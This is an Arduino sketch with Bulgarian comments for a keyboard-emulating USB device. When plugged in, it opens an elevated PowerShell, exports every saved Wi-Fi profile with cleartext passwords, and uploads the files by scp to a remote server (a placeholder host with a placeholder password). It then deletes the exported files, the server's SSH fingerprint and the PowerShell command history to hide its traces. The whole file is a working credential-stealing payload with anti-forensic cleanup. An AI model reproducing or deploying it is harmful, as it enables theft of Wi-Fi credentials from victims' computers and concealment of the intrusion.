#include <Keyboard.h>
void setup() {
  Keyboard.begin();
  delay(3000);//Delay
  Keyboard.write(KEY_LEFT_GUI);//Бутон win
  delay(700); 

  Keyboard.print("powershell"); // отваряме конзолата
  //Keyboard.write(KEY_RETURN);
  delay(700);

  Keyboard.write(KEY_RIGHT_ARROW);//стрелка надясно
  delay(200); 
  Keyboard.write(KEY_DOWN_ARROW);//стрелка надолу
  delay(200); 
 
  Keyboard.write(KEY_RETURN);//ентър
  delay(600);
  Keyboard.press(KEY_LEFT_ARROW);//стрелка наляво
  delay(200);
  Keyboard.write(KEY_RETURN);//ентър
  delay(800); 
  // ОТВОРИХМЕ КОНЗОЛАТА



  
 // Keyboard.println("netsh wlan show profile"); //показване на Wi-fi мрежите
 // delay(500);
 
  Keyboard.println("netsh wlan export profile folder=C:\\ key=clear"); //експорира информацията за мрежите в *.xml файлове в диск C: 
  delay(500);

  Keyboard.println("scp -P 22 C:\\*.xml USER@example.com:/home/USB/"); //Копира ги на сървъра
  delay(2000);  
  
  Keyboard.println("yes"); //съхранява отпечатъка на сървъра 
  delay(500);
    
  Keyboard.print("PASSWORD"); //Парола на сървъра
  Keyboard.write(KEY_RETURN);
  delay(2500);  

  Keyboard.println("Remove-item C:\\*.xml"); //Изтрива *.xml файловете от C:
  delay(500);  

  Keyboard.println("ssh-keygen -R [example.com]:22"); //Изтрива отпечатъка на сървъра
  delay(500);
  
  Keyboard.println("Remove-Item ~\\.ssh\\known_hosts.old"); //Изтрива отпечатъка на сървъра
  delay(500);
  
  Keyboard.println("Remove-Item (Get-PSReadlineOption).HistorySavePath"); //Изтриване на историята
  delay(500); 
  Keyboard.print("exit"); //Затваряне на конзолатз
  Keyboard.write(KEY_RETURN);
 
  
    
    Keyboard.end();
}
void loop()
{
}
